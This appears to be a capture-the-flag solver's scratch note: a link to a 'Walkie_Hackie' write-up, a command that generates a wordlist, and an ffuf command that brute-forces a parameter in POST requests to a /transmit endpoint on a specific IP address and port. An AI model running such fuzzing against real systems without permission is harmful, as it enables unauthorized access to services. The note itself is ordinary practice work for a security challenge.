'''
https://lukasmarckmiller.me/writeup/2022/03/06/Walkie_Hackie/

python3 gen_fuzzer.py > 00_ff.lst

ffuf -w 00_ff.lst:W1,00_ff.lst:W2 -u http://94.237.54.75:43647/transmit -X POST -H "Content-Type: application/x-www-form-urlencoded" -d 'pa=AAAAAAAA&sw=73214693&pl=W1ffW2' -c -fw 403
'''
